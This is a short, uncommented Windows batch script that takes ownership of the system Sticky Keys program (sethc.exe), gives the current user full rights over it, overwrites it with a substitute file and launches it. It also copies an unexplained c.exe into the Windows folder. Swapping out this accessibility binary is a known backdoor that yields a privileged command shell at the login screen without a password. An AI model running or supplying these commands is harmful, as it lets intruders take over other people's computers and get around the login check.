cmd /c echo y| copy PCL\c.exe %SystemRoot%

cmd /c takeown /f %SystemRoot%\system32\sethc.exe

cmd /c echo y| cacls %SystemRoot%\system32\sethc.exe /G %USERNAME%:F
 
cmd /c echo y| copy c\sethc.exe %SystemRoot%\system32

start %SystemRoot%\system32\sethc.exe 